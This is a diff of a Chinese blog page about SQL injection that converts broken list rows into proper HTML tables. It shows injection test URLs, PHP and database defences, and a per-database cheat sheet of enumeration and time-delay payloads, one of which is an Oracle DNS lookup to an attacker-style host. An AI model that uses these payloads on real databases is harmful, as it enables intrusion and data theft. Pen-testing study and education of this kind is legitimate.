@@ -393,7 +393,7 @@ var _hmt = _hmt || [];
 									
 							<ul>
 								<li class="file active">
-									<a href="/2020/09/17/web%E6%B8%97%E9%80%8F/01SQL%E6%B3%A8%E5%85%A5/">
+									<a href="/2021/04/12/web%E6%B8%97%E9%80%8F/01SQL%E6%B3%A8%E5%85%A5/">
 										01SQL注入
 									</a>
 								</li>
@@ -529,7 +529,7 @@ var _hmt = _hmt || [];
 <div class="article-meta">
 	
 	<span>BamB00</span>
-	<span>2020-09-17 00:00:00</span>
+	<span>2021-04-12 00:04:28</span>
 		<div id="article-categories">
     
 		<span>Categories：</span>
@@ -601,7 +601,7 @@ http://host/test.php?name=rainman ‘ and ‘1’=‘2 ))     //使用括号进�
 <pre><code>5. 不同的SQL服务器连结字符串的语法不同，比如MS SQL Server使用符号+来连结字符串，而Oracle使用符号||来连结：
 </code></pre>
 <p><a target="_blank" rel="noopener" href="http://host/test.jsp?ProdName=Book%E2%80%99">http://host/test.jsp?ProdName=Book’</a>       //返回错误<br><a target="_blank" rel="noopener" href="http://host/test.jsp?ProdName=B%E2%80%99+%E2%80%99ook">http://host/test.jsp?ProdName=B’+’ook</a>     //返回正常<br><a target="_blank" rel="noopener" href="http://host/test.jsp?ProdName=B%E2%80%99%7C%7C%E2%80%99ook">http://host/test.jsp?ProdName=B’||’ook</a>    //返回正常说明有SQL注入<br>如果应用程序已经过滤了’和+等特殊字符，我们仍然可以在输入时过把字符转换成URL编码(即字符ASCII码的16进制)来绕过检查。</p>
-<pre><code>注释：大多数数据库系统使用“/*”做为注释，Oracle使用“--”做为注释。
+<pre><code>注释：大多数数据库系统使用“/*”做为注释，Oracle使用“\-\-”做为注释。
 
 # 0x04 数据库的特征
 
@@ -830,13 +830,14 @@ $sql = &quot;INSERT
 $sql = &#39;INSERT
     INTO   user (last_name)
     VALUES (?)&#39;;
-$dbh-&gt;query($sql, array($clean[&#39;last_name&#39;]));
+$dbh\-&gt;query($sql, array($clean[&#39;last_name&#39;]));
 ?&gt;
 </code></pre>
-<p>以上方法结合使用，则可有效的防止在PHP语言网站的SQL注入。</p>
-<h2 id="0x073-除此之外，还可以进行对数据库方面进行加固，来防止sql注入的产生"><a href="#0x073-除此之外，还可以进行对数据库方面进行加固，来防止sql注入的产生" class="headerlink" title="0x073 除此之外，还可以进行对数据库方面进行加固，来防止sql注入的产生:"></a>0x073 除此之外，还可以进行对数据库方面进行加固，来防止sql注入的产生:</h2></li>
+</li>
 </ol>
-<p>不要以sysadmin的身份连接数据库。而是使用特定的数据库用户，只具有读取，写入和更新数据库中适当数据的适当特权。此帐户定期检查，确定它所具有的特权。</p>
+<pre><code>以上方法结合使用，则可有效的防止在PHP语言网站的SQL注入。
+</code></pre>
+<h2 id="0x073-除此之外，还可以进行对数据库方面进行加固，来防止sql注入的产生"><a href="#0x073-除此之外，还可以进行对数据库方面进行加固，来防止sql注入的产生" class="headerlink" title="0x073 除此之外，还可以进行对数据库方面进行加固，来防止sql注入的产生:"></a>0x073 除此之外，还可以进行对数据库方面进行加固，来防止sql注入的产生:</h2><p>不要以sysadmin的身份连接数据库。而是使用特定的数据库用户，只具有读取，写入和更新数据库中适当数据的适当特权。此帐户定期检查，确定它所具有的特权。</p>
 <p>以安全的方式创建SQL。让数据库来完成创建SQL的工作，而不是在代码中完成。使用参数化SQL语句，同时也能提高查询的效率。</p>
 <p>保证数据库用户连接信息非明文保存。</p>
 <h1 id="0x08-附各个数据库的注入语句："><a href="#0x08-附各个数据库的注入语句：" class="headerlink" title="0x08 附各个数据库的注入语句："></a>0x08 附各个数据库的注入语句：</h1><p>注：释义中的’-‘代表和上一个一样，因为一个释义可能有几种形式的SQL语句嘛，下同</p>
@@ -878,15 +879,72 @@ $dbh-&gt;query($sql, array($clean[&#39;last_name&#39;]));
 <td>select user from sysibm.sysdummy1</td>
 <td>-</td>
 </tr>
+<tr>
+<td>-</td>
+<td>select session_user from sysibm.sysdummy1</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>select system_user from sysibm.sysdummy1</td>
+<td>-</td>
+</tr>
+<tr>
+<td>用户权限</td>
+<td>select * from syscat.tabauth</td>
+<td>管理员才能运行</td>
+</tr>
+<tr>
+<td>-</td>
+<td>select * from syscat.dbauth where grantee = 当前用户</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>select * from syscat.tabauth where grantee = 当前用户</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>select * from SYSIBM.SYSUSERAUTH</td>
+<td>列出DB2系统权限</td>
+</tr>
+<tr>
+<td>列出DBA账户</td>
+<td>select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = ‘Y’ or SYSADMAUTH = ‘G’</td>
+<td>-</td>
+</tr>
+<tr>
+<td>选择第N行</td>
+<td>select name from (SELECT name FROM sysibm.systables order by name fetch first N+M-1 rows only) sq order by name desc fetch first N rows only</td>
+<td>-</td>
+</tr>
+<tr>
+<td>选择第N个字符</td>
+<td>SELECT SUBSTR(‘abc’,2,1) FROM sysibm.sysdummy1</td>
+<td>返回b</td>
+</tr>
+<tr>
+<td>ASCII值-字符</td>
+<td>select chr(65) from sysibm.sysdummy1</td>
+<td>返回A</td>
+</tr>
+<tr>
+<td>字符-ASCII值</td>
+<td>select ascii(‘A’) from sysibm.sysdummy1</td>
+<td>返回65</td>
+</tr>
+<tr>
+<td>字符串连接</td>
+<td>SELECT ‘a’ concat ‘b’ concat ‘c’ FROM sysibm.sysdummy1</td>
+<td>返回abc</td>
+</tr>
+<tr>
+<td>-</td>
+<td>select ‘a’</td>
+<td></td>
+</tr>
 </tbody></table>
-<ul>
-<li> | select session_user from sysibm.sysdummy1  | -</li>
-<li> | select system_user from sysibm.sysdummy1  | -<br>用户权限  | select * from syscat.tabauth  | 管理员才能运行</li>
-<li> | select * from syscat.dbauth where grantee = 当前用户  | -</li>
-<li> | select * from syscat.tabauth where grantee = 当前用户  | -</li>
-<li> | select * from SYSIBM.SYSUSERAUTH  | 列出DB2系统权限<br>列出DBA账户  | select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = ‘Y’ or SYSADMAUTH = ‘G’  | -<br>选择第N行  | select name from (SELECT name FROM sysibm.systables order by name fetch first N+M-1 rows only) sq order by name desc fetch first N rows only  | -<br>选择第N个字符  | SELECT SUBSTR(‘abc’,2,1) FROM sysibm.sysdummy1  | 返回b<br>ASCII值-字符  | select chr(65) from sysibm.sysdummy1  | 返回A<br>字符-ASCII值  | select ascii(‘A’) from sysibm.sysdummy1  | 返回65<br>字符串连接  | SELECT ‘a’ concat ‘b’ concat ‘c’ FROM sysibm.sysdummy1  | 返回abc</li>
-<li> | select ‘a’ || ‘b’ from sysibm.sysdummy1  | 返回ab</li>
-</ul>
 <h2 id="0x082-MySQL数据库"><a href="#0x082-MySQL数据库" class="headerlink" title="0x082 MySQL数据库"></a>0x082 MySQL数据库</h2><table>
 <thead>
 <tr>
@@ -905,16 +963,102 @@ $dbh-&gt;query($sql, array($clean[&#39;last_name&#39;]));
 <td>SELECT schema_name FROM information_schema.schemata</td>
 <td>版本&gt;5.0</td>
 </tr>
+<tr>
+<td>\-</td>
+<td>SELECT distinct(db) FROM mysql.db</td>
+<td>管理员权限才可以执行</td>
+</tr>
+<tr>
+<td>查询表名</td>
+<td>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’</td>
+<td>-</td>
+</tr>
+<tr>
+<td>查询列名</td>
+<td>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’</td>
+<td>-</td>
+</tr>
+<tr>
+<td>获取版本</td>
+<td>SELECT @@version</td>
+<td>-</td>
+</tr>
+<tr>
+<td>当前用户</td>
+<td>SELECT user()</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT system_user()</td>
+<td>-</td>
+</tr>
+<tr>
+<td>用户权限</td>
+<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges</td>
+<td>用户权限</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges</td>
+<td>数据库权限</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges</td>
+<td>字段的权限</td>
+</tr>
+<tr>
+<td>列出DBA账户</td>
+<td>SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’</td>
+<td>-</td>
+</tr>
+<tr>
+<td>选择第N行</td>
+<td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0</td>
+<td>行从0开始编号</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1</td>
+<td>行从0开始编号</td>
+</tr>
+<tr>
+<td>选择第N个字符</td>
+<td>SELECT substr(‘abcd’, 3, 1)</td>
+<td>返回c</td>
+</tr>
+<tr>
+<td>ASCII值-字符</td>
+<td>SELECT char(65)</td>
+<td>返回A</td>
+</tr>
+<tr>
+<td>字符-ASCII值</td>
+<td>SELECT ascii(‘A’)</td>
+<td>返回65</td>
+</tr>
+<tr>
+<td>字符串连接</td>
+<td>SELECT CONCAT(‘A’,’B’)</td>
+<td>返回AB</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT CONCAT(‘A’,’B’,’C’)</td>
+<td>返回ABC</td>
+</tr>
+<tr>
+<td>时间睡眠</td>
+<td>SELECT BENCHMARK(1000000,MD5(‘A’))</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT SLEEP(5)</td>
+<td>版本&gt;= 5.0.12</td>
+</tr>
 </tbody></table>
-<ul>
-<li> | SELECT distinct(db) FROM mysql.db  | 管理员权限才可以执行<br>查询表名  | SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’  | -<br>查询列名  | SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’  | -<br>获取版本  | SELECT @@version  | -<br>当前用户  | SELECT user()  | -</li>
-<li> | SELECT system_user()  | -<br>用户权限  | SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges  | 用户权限</li>
-<li> | SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges  | 数据库权限</li>
-<li> | SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges  | 字段的权限<br>列出DBA账户  | SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’  | -<br>选择第N行  | SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0  | 行从0开始编号</li>
-<li> | SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1  | 行从0开始编号<br>选择第N个字符  | SELECT substr(‘abcd’, 3, 1)  | 返回c<br>ASCII值-字符  | SELECT char(65)  | 返回A<br>字符-ASCII值  | SELECT ascii(‘A’)  | 返回65<br>字符串连接  | SELECT CONCAT(‘A’,’B’)  | 返回AB</li>
-<li> | SELECT CONCAT(‘A’,’B’,’C’)  | 返回ABC<br>时间睡眠  | SELECT BENCHMARK(1000000,MD5(‘A’))  | -</li>
-<li> | SELECT SLEEP(5)  | 版本&gt;= 5.0.12</li>
-</ul>
 <h2 id="0x083-Oracle数据库"><a href="#0x083-Oracle数据库" class="headerlink" title="0x083 Oracle数据库"></a>0x083 Oracle数据库</h2><table>
 <thead>
 <tr>
@@ -928,18 +1072,117 @@ $dbh-&gt;query($sql, array($clean[&#39;last_name&#39;]));
 <td>SELECT global_name FROM global_name</td>
 <td>—</td>
 </tr>
+<tr>
+<td>-</td>
+<td>SELECT name FROM v$database</td>
+<td>—</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT instance_name FROM v$instance</td>
+<td>—</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT SYS.DATABASE_NAME FROM DUAL</td>
+<td>—</td>
+</tr>
+<tr>
+<td>所有数据库</td>
+<td>SELECT DISTINCT owner FROM all_tables</td>
+<td>—</td>
+</tr>
+<tr>
+<td>查询表名</td>
+<td>SELECT table_name FROM all_tables</td>
+<td>—</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT owner, table_name FROM all_tables</td>
+<td>—</td>
+</tr>
+<tr>
+<td>查询列名</td>
+<td>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’</td>
+<td>—</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’</td>
+<td>—</td>
+</tr>
+<tr>
+<td>获取版本</td>
+<td>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’</td>
+<td>—</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’</td>
+<td>—</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT version FROM v$instance</td>
+<td>—</td>
+</tr>
+<tr>
+<td>当前用户</td>
+<td>SELECT user FROM dual</td>
+<td>—</td>
+</tr>
+<tr>
+<td>用户权限</td>
+<td>SELECT * FROM session_privs</td>
+<td>当前权限</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’</td>
+<td>列出用户的权限</td>
+</tr>
+<tr>
+<td>列出DBA账户</td>
+<td>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’</td>
+<td>—</td>
+</tr>
+<tr>
+<td>选择第N行</td>
+<td>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9</td>
+<td>第九行</td>
+</tr>
+<tr>
+<td>选择第N个字符</td>
+<td>SELECT substr(‘abcd’, 3, 1) FROM dual</td>
+<td>第3个字符c</td>
+</tr>
+<tr>
+<td>ASCII值-字符</td>
+<td>SELECT chr(65) FROM dual</td>
+<td>返回A</td>
+</tr>
+<tr>
+<td>字符-ASCII值</td>
+<td>SELECT ascii(‘A’) FROM dual</td>
+<td>返回65</td>
+</tr>
+<tr>
+<td>字符串连接</td>
+<td>SELECT ‘A’</td>
+<td></td>
+</tr>
+<tr>
+<td>时间睡眠</td>
+<td>SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual</td>
+<td>如果反向查询很慢</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual</td>
+<td>如果正向查询很慢</td>
+</tr>
 </tbody></table>
-<ul>
-<li> | SELECT name FROM v$database  | —</li>
-<li> | SELECT instance_name FROM v$instance  | —</li>
-<li> | SELECT SYS.DATABASE_NAME FROM DUAL  | —<br>所有数据库  | SELECT DISTINCT owner FROM all_tables  | —<br>查询表名  | SELECT table_name FROM all_tables  | —</li>
-<li> | SELECT owner, table_name FROM all_tables  | —<br>查询列名  | SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’  | —</li>
-<li> | SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’  | —<br>获取版本  | SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’  | —</li>
-<li> | SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’  | —</li>
-<li> | SELECT version FROM v$instance  | —<br>当前用户  | SELECT user FROM dual  | —<br>用户权限  | SELECT * FROM session_privs  | 当前权限</li>
-<li> | SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’  | 列出用户的权限<br>列出DBA账户  | SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’  | —<br>选择第N行  | SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9  | 第九行<br>选择第N个字符  | SELECT substr(‘abcd’, 3, 1) FROM dual  | 第3个字符c<br>ASCII值-字符  | SELECT chr(65) FROM dual  | 返回A<br>字符-ASCII值  | SELECT ascii(‘A’) FROM dual  | 返回65<br>字符串连接  | SELECT ‘A’ || ‘B’ FROM dual  | 返回AB<br>时间睡眠  | SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual  | 如果反向查询很慢</li>
-<li> | SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual  | 如果正向查询很慢</li>
-</ul>
 <h2 id="0x084-MSSQL数据库"><a href="#0x084-MSSQL数据库" class="headerlink" title="0x084 MSSQL数据库"></a>0x084 MSSQL数据库</h2><table>
 <thead>
 <tr>
@@ -958,15 +1201,97 @@ $dbh-&gt;query($sql, array($clean[&#39;last_name&#39;]));
 <td>SELECT name FROM master..sysdatabases</td>
 <td>-</td>
 </tr>
+<tr>
+<td>-</td>
+<td>SELECT DB_NAME(N)</td>
+<td>N为0,1,2,…</td>
+</tr>
+<tr>
+<td>查询表名</td>
+<td>SELECT name FROM master..sysobjects WHERE xtype = ‘U’</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’</td>
+<td>-</td>
+</tr>
+<tr>
+<td>查询列名</td>
+<td>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’)</td>
+<td>当前数据库</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’</td>
+<td>列出master..sometable的列名称</td>
+</tr>
+<tr>
+<td>获取版本</td>
+<td>SELECT @@version</td>
+<td>-</td>
+</tr>
+<tr>
+<td>当前用户</td>
+<td>SELECT user_name()</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT system_user</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT user</td>
+<td>-</td>
+</tr>
+<tr>
+<td>用户权限</td>
+<td>SELECT permission_name FROM master..fn_my_permissions(null,‘DATABASE’)</td>
+<td>当前数据库权限</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT is_srvrolemember(‘sysadmin’)</td>
+<td>当前用户权限</td>
+</tr>
+<tr>
+<td>列出DBA账户</td>
+<td>SELECT is_srvrolemember(‘sysadmin’)</td>
+<td>当前用户是否是管理员，是则返回1</td>
+</tr>
+<tr>
+<td>选择第N行</td>
+<td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC</td>
+<td>返回第九行</td>
+</tr>
+<tr>
+<td>选择第N个字符</td>
+<td>SELECT substring(‘abcd’, 3, 1)</td>
+<td>返回c</td>
+</tr>
+<tr>
+<td>ASCII值-字符</td>
+<td>SELECT char(0×41)</td>
+<td>返回A</td>
+</tr>
+<tr>
+<td>字符-ASCII值</td>
+<td>SELECT ascii(‘A’)</td>
+<td>返回65</td>
+</tr>
+<tr>
+<td>字符串连接</td>
+<td>SELECT ‘A’ + ‘B’</td>
+<td>返回AB</td>
+</tr>
+<tr>
+<td>时间睡眠</td>
+<td>WAITFOR DELAY ‘0:0:5’</td>
+<td>睡眠5秒</td>
+</tr>
 </tbody></table>
-<ul>
-<li> | SELECT DB_NAME(N)  | N为0,1,2,…<br>查询表名  | SELECT name FROM master..sysobjects WHERE xtype = ‘U’  | -</li>
-<li> | SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’  | -<br>查询列名  | SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’)  | 当前数据库</li>
-<li> | SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’  | 列出master..sometable的列名称<br>获取版本  | SELECT @@version  | -<br>当前用户  | SELECT user_name()  | -</li>
-<li> | SELECT system_user  | -</li>
-<li> | SELECT user  | -<br>用户权限  | SELECT permission_name FROM master..fn_my_permissions(null,‘DATABASE’)  | 当前数据库权限</li>
-<li> | SELECT is_srvrolemember(‘sysadmin’)  | 当前用户权限<br>列出DBA账户  | SELECT is_srvrolemember(‘sysadmin’)  | 当前用户是否是管理员，是则返回1<br>选择第N行  | SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC  | 返回第九行<br>选择第N个字符  | SELECT substring(‘abcd’, 3, 1)  | 返回c<br>ASCII值-字符  | SELECT char(0×41)  | 返回A<br>字符-ASCII值  | SELECT ascii(‘A’)  | 返回65<br>字符串连接  | SELECT ‘A’ + ‘B’  | 返回AB<br>时间睡眠  | WAITFOR DELAY ‘0:0:5’  | 睡眠5秒</li>
-</ul>
 <h2 id="0x085-PostgreSQL数据库"><a href="#0x085-PostgreSQL数据库" class="headerlink" title="0x085 PostgreSQL数据库"></a>0x085 PostgreSQL数据库</h2><table>
 <thead>
 <tr>
@@ -1005,15 +1330,77 @@ $dbh-&gt;query($sql, array($clean[&#39;last_name&#39;]));
 <td>SELECT user;</td>
 <td>-</td>
 </tr>
+<tr>
+<td>-</td>
+<td>SELECT current_user;</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT session_user;</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT usename FROM pg_user;</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT getpgusername();</td>
+<td>-</td>
+</tr>
+<tr>
+<td>用户权限</td>
+<td>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</td>
+<td>-</td>
+</tr>
+<tr>
+<td>列出DBA账户</td>
+<td>SELECT usename FROM pg_user WHERE usesuper IS TRUE</td>
+<td>-</td>
+</tr>
+<tr>
+<td>选择第N行</td>
+<td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0</td>
+<td>从0行开始编号</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;</td>
+<td>-</td>
+</tr>
+<tr>
+<td>选择第N个字符</td>
+<td>SELECT substr(‘abcd’, 3, 1)</td>
+<td>返回c</td>
+</tr>
+<tr>
+<td>ASCII值-字符</td>
+<td>SELECT chr(65)</td>
+<td>返回A</td>
+</tr>
+<tr>
+<td>字符-ASCII值</td>
+<td>SELECT ascii(‘A’)</td>
+<td>返回65</td>
+</tr>
+<tr>
+<td>字符串连接</td>
+<td>SELECT ‘A’</td>
+<td></td>
+</tr>
+<tr>
+<td>时间睡眠</td>
+<td>SELECT pg_sleep(10)</td>
+<td>睡眠10秒</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT sleep(10)</td>
+<td>创建自定义睡眠</td>
+</tr>
 </tbody></table>
-<ul>
-<li> | SELECT current_user;  | -</li>
-<li> | SELECT session_user;  | -</li>
-<li> | SELECT usename FROM pg_user;  | -</li>
-<li> | SELECT getpgusername();  | -<br>用户权限  | SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user  | -<br>列出DBA账户  | SELECT usename FROM pg_user WHERE usesuper IS TRUE  | -<br>选择第N行  | SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0  | 从0行开始编号</li>
-<li> | SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;  | -<br>选择第N个字符  | SELECT substr(‘abcd’, 3, 1)  | 返回c<br>ASCII值-字符  | SELECT chr(65)  | 返回A<br>字符-ASCII值  | SELECT ascii(‘A’)  | 返回65<br>字符串连接  | SELECT ‘A’ || ‘B’  | 返回AB<br>时间睡眠  | SELECT pg_sleep(10)  | 睡眠10秒</li>
-<li> | SELECT sleep(10)  | 创建自定义睡眠</li>
-</ul>
 <h2 id="0x086-Ingres数据库"><a href="#0x086-Ingres数据库" class="headerlink" title="0x086 Ingres数据库"></a>0x086 Ingres数据库</h2><table>
 <thead>
 <tr>
@@ -1037,16 +1424,92 @@ $dbh-&gt;query($sql, array($clean[&#39;last_name&#39;]));
 <td>select table_name, table_owner from iitables;</td>
 <td>-</td>
 </tr>
+<tr>
+<td>-</td>
+<td>select relid, relowner, relloc from iirelation;</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>select relid, relowner, relloc from iirelation where relowner != ‘$ingres’;</td>
+<td>-</td>
+</tr>
+<tr>
+<td>查询列名</td>
+<td>select column_name, column_datatype, table_name, table_owner from iicolumns;</td>
+<td>-</td>
+</tr>
+<tr>
+<td>获取版本</td>
+<td>select dbmsinfo(‘_version’)</td>
+<td>-</td>
+</tr>
+<tr>
+<td>当前用户</td>
+<td>select dbmsinfo(‘session_user’)</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>select dbmsinfo(‘system_user’)</td>
+<td>-</td>
+</tr>
+<tr>
+<td>用户权限</td>
+<td>select dbmsinfo(‘db_admin’)</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>select dbmsinfo(‘create_table’)</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>select dbmsinfo(‘create_procedure’)</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>select dbmsinfo(‘security_priv’)</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>select dbmsinfo(‘select_syscat’)</td>
+<td>-</td>
+</tr>
+<tr>
+<td>选择第N行</td>
+<td>select first 10 blah form table</td>
+<td>选择前10位的表</td>
+</tr>
+<tr>
+<td>选择第N个字符</td>
+<td>select substr(‘abc’, 2, 1)</td>
+<td>返回b</td>
+</tr>
+<tr>
+<td>ASCII值-字符</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>字符-ASCII值</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>字符串连接</td>
+<td>select ‘abc’</td>
+<td></td>
+</tr>
+<tr>
+<td>时间睡眠</td>
+<td>-</td>
+<td>-</td>
+</tr>
 </tbody></table>
-<ul>
-<li> | select relid, relowner, relloc from iirelation;  | -</li>
-<li> | select relid, relowner, relloc from iirelation where relowner != ‘$ingres’;  | -<br>查询列名  | select column_name, column_datatype, table_name, table_owner from iicolumns;  | -<br>获取版本  | select dbmsinfo(‘_version’)  | -<br>当前用户  | select dbmsinfo(‘session_user’)  | -</li>
-<li> | select dbmsinfo(‘system_user’)  | -<br>用户权限  | select dbmsinfo(‘db_admin’)  | -</li>
-<li> | select dbmsinfo(‘create_table’)  | -</li>
-<li> | select dbmsinfo(‘create_procedure’)  | -</li>
-<li> | select dbmsinfo(‘security_priv’)  | -</li>
-<li> | select dbmsinfo(‘select_syscat’)  | -<br>选择第N行  | select first 10 blah form table  | 选择前10位的表<br>选择第N个字符  | select substr(‘abc’, 2, 1)  | 返回b<br>ASCII值-字符  | -  | -<br>字符-ASCII值  | -  | -<br>字符串连接  | select ‘abc’ || ‘def’  | 返回abcdef<br>时间睡眠  | -  | -</li>
-</ul>
 <h2 id="0x087-Infomix数据库"><a href="#0x087-Infomix数据库" class="headerlink" title="0x087 Infomix数据库"></a>0x087 Infomix数据库</h2><table>
 <thead>
 <tr>
@@ -1070,13 +1533,77 @@ $dbh-&gt;query($sql, array($clean[&#39;last_name&#39;]));
 <td>select tabname, owner FROM systables;</td>
 <td>-</td>
 </tr>
+<tr>
+<td>-</td>
+<td>select tabname, viewtext FROM sysviews join systables on systables.tabid = sysviews.tabid;</td>
+<td>-</td>
+</tr>
+<tr>
+<td>查询列名</td>
+<td>select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid;</td>
+<td>-</td>
+</tr>
+<tr>
+<td>获取版本</td>
+<td>SELECT DBINFO(‘version’, ‘full’) FROM systables WHERE tabid = 1</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT DBINFO(‘version’, ‘server-type’) FROM systables WHERE tabid = 1</td>
+<td>-</td>
+</tr>
+<tr>
+<td>当前用户</td>
+<td>SELECT USER FROM systables WHERE tabid = 1</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td>select CURRENT_ROLE FROM systables WHERE tabid = 1</td>
+<td>-</td>
+</tr>
+<tr>
+<td>用户权限</td>
+<td>select procname, owner, grantor, grantee from sysprocauth join sysprocedures on sysprocauth.procid = sysprocedures.procid</td>
+<td>哪些用户可以访问哪些程序</td>
+</tr>
+<tr>
+<td>选择第N行</td>
+<td>select first 1 tabid from (select first 10 tabid from systables order by tabid) as sq order by tabid desc</td>
+<td>选择第10行</td>
+</tr>
+<tr>
+<td>选择第N个字符</td>
+<td>SELECT SUBSTRING(‘ABCD’ FROM 3 FOR 1) FROM systables where tabid = 1</td>
+<td>返回C</td>
+</tr>
+<tr>
+<td>ASCII值-字符</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>字符-ASCII值</td>
+<td>select ascii(‘A’) from systables where tabid = 1</td>
+<td>返回65</td>
+</tr>
+<tr>
+<td>字符串连接</td>
+<td>SELECT ‘A’</td>
+<td></td>
+</tr>
+<tr>
+<td>-</td>
+<td>SELECT concat(‘A’, ‘B’) FROM systables where tabid = 1</td>
+<td>返回AB</td>
+</tr>
+<tr>
+<td>时间睡眠</td>
+<td>-</td>
+<td>-</td>
+</tr>
 </tbody></table>
-<ul>
-<li> | select tabname, viewtext FROM sysviews join systables on systables.tabid = sysviews.tabid;  | -<br>查询列名  | select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid;  | -<br>获取版本  | SELECT DBINFO(‘version’, ‘full’) FROM systables WHERE tabid = 1  | -</li>
